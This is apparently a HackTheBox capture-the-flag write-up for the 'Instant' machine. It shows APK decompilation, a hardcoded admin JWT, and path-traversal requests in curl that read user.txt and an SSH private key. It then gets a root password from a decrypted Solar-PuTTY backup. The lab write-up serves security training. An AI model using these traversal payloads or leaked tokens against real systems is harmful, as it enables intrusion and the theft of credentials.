---
title: Instant
tags:
  - HackTheBox
  - Medium
  - Linux
  - APK
  - Swagger-UI
  - JWT
  - LFI
  - Solar_PuTTY
date: 2025-02-01T00:00:00Z
---
![](Pasted%20image%2020250201190404.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.37 instant.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- instant.htb > sC.txt

[redacted]
PORT   STATE SERVICE
```

So I checked its website:

![](Pasted%20image%2020250201190611.png)

I downloaded its apk and extracted all its data using **apktool**:

```shell
apktool d instant.apk
```

Then I opened its folder with code and searched for some communication with `instant.htb`:

![](Pasted%20image%2020250201192540.png)

I found two new subdomains in `network_security_config.xml`:

![](Pasted%20image%2020250201192638.png)

`mywalletv1.instant.htb` and `swagger-ui.instant.htb`

![](Pasted%20image%2020250201192839.png)

## Exploitation

Once here I'll try to register a user and see what happens:

![](Pasted%20image%2020250201193042.png)

![](Pasted%20image%2020250201193103.png)

I'll use the following curl commands:

```shell
# first register a user
curl -X POST "http://swagger-ui.instant.htb/api/v1/register" -H "accept: application/json" -H "Content-Type: application/json" -d "{ \"email\": \"gitblanc@gmail.com\", \"password\": \"gitblanc\", \"pin\": \"12345\", \"username\": \"gitblanc\"}"

# then login
curl -X POST "http://swagger-ui.instant.htb/api/v1/login" -H "accept: application/json" -H "Content-Type: application/json" -d "{ \"password\": \"gitblanc\", \"username\": \"gitblanc\"}"

# I get this access token
{"Access-Token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwicm9sZSI6Imluc3RhbnRpYW4iLCJ3YWxJZCI6ImYzYTllOWMxLTczYjEtNGEyZi1iOTVjLWExNjRmNzEwYjBjMiIsImV4cCI6MTczODQ2NDk2M30.JcdPYrGLXiQKQA0MoOvd9oXk65j8cP62XvVcpQHTkEA","Status":201}
```

I decided to search for an admin jwt inside the apk and found one inside `AdminActivities.smali`:

```shell
"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```

So now I'll use this as an admin jwt to make a petition to `/log` endpoint:

```shell
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2Fuser.txt" -H "accept: application/json" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```

### User flag

![](Pasted%20image%2020250201200249.png)

Now I'll try to get ssh id_rsa keys:

```shell
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F.ssh%2Fid_rsa" -H "accept: application/json" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

{"/home/shirohige/logs/../.ssh/id_rsa":["-----BEGIN OPENSSH PRIVATE KEY-----\n","b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\n","NhAAAAAwEAAQAAAYEApbntlalmnZWcTVZ0skIN2+Ppqr4xjYgIrZyZzd9YtJGuv/w3GW8B\n","nwQ1vzh3BDyxhL3WLA3jPnkbB8j4luRrOfHNjK8lGefOMYtY/T5hE0VeHv73uEOA/BoeaH\n","dAGhQuAAsDj8Avy1yQMZDV31PHcGEDu/0dU9jGmhjXfS70gfebpII3js9OmKXQAFc2T5k/\n","5xL+1MHnZBiQqKvjbphueqpy9gDadsiAvKtOA8I6hpDDLZalak9Rgi+BsFvBsnz244uCBY\n","8juWZrzme8TG5Np6KIg1tdZ1cqRL7lNVMgo7AdwQCVrUhBxKvTEJmIzR/4o+/w9njJ3+WF\n","uaMbBzOsNCAnXb1Mk0ak42gNLqcrYmupUepN1QuZPL7xAbDNYK2OCMxws3rFPHgjhbqWPS\n","jBlC7kaBZFqbUOA57SZPqJY9+F0jttWqxLxr5rtL15JNaG+rDfkRmmMzbGryCRiwPc//AF\n","Oq8vzE9XjiXZ2P/jJ/EXahuaL9A2Zf9YMLabUgGDAAAFiKxBZXusQWV7AAAAB3NzaC1yc2\n","EAAAGBAKW57ZWpZp2VnE1WdLJCDdvj6aq+MY2ICK2cmc3fWLS[redacted]
IY6nBT57DOOY\n","CGGElC1cS7pOg/XaOh1bPMaJ4Hi3HUWwAAAMEAvV2Gzd98tSB92CSKct+eFqcX2se5UiJZ\n","n90GYFZoYuRerYOQjdGOOCJ4D/SkIpv0qqPQNulejh7DuHKiohmK8S59uMPMzgzQ4BRW0G\n","HwDs1CAcoWDnh7yhGK6lZM3950r1A/RPwt9FcvWfEoQqwvCV37L7YJJ7rDWlTa06qHMRMP\n","5VNy/4CNnMdXALx0OMVNNoY1wPTAb0x/Pgvm24KcQn/7WCms865is11BwYYPaig5F5Zo1r\n","bhd6Uh7ofGRW/5AAAAEXNoaXJvaGlnZUBpbnN0YW50AQ==\n","-----END OPENSSH PRIVATE KEY-----\n"],"Status":201}
```

Now I have `shirohige`'s private key. I'll connect to the machine with it:

```shell
# adapt it to a file
chmod 400 id_rsa
ssh -i id_rsa shirohige@instant.htb
```

> I'm in :D

![](Pasted%20image%2020250201201703.png)

## Privilege Escalation

I found something weird inside `/opt/backups/Solar-PuTTY`: `sessions-backup.dat`

It seems to be a session backup, so I found a [Solar-PuTTY Session Decryptor](https://github.com/VoidSec/SolarPuttyDecrypt)

> *BAD NEWS*: I need a Windows pc for this part, so I'll create a VM and run the executable with the `sessions-backup.dat` file

![](Pasted%20image%2020250201205053.png)

So once executed the decryptor, I found the root password inside: `root:12**24nzC!r0c%q12`

### Root flag

![](Pasted%20image%2020250201205237.png)

==Machine pwned!==